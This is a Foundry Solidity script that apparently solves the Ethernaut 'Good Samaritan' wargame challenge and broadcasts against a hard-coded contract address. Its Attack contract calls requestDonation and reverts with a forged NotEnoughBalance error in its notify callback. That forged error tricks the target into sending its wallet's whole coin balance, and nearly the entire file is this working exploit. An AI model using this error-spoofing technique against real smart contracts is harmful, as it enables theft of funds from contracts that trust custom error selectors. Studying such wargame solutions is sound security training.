// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/GoodSamaritan.sol";

contract GoodSamaritanScript is Script {
    GoodSamaritan public target;
    Wallet public wallet;
    Coin public coin;


    function setUp() public {
        target = GoodSamaritan(0x50e7D4121fb606Ee9072c54EA980fBC8df8638B9);
        wallet = target.wallet();
        coin = target.coin();
    }

    function run() public {
        vm.startBroadcast();

        console.log("initial balance : ", coin.balances(address(wallet)));

        Attack a = new Attack(target);
        a.a();

        console.log("final balance : ", coin.balances(address(wallet)));

        vm.stopBroadcast();
    }

}

contract Attack {

    GoodSamaritan public target;

    error NotEnoughBalance();

    constructor(GoodSamaritan target_) {
        target = target_;
    }

    function a() external {
        target.requestDonation();
    }

    function notify(uint256 amount) external {
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }
    
}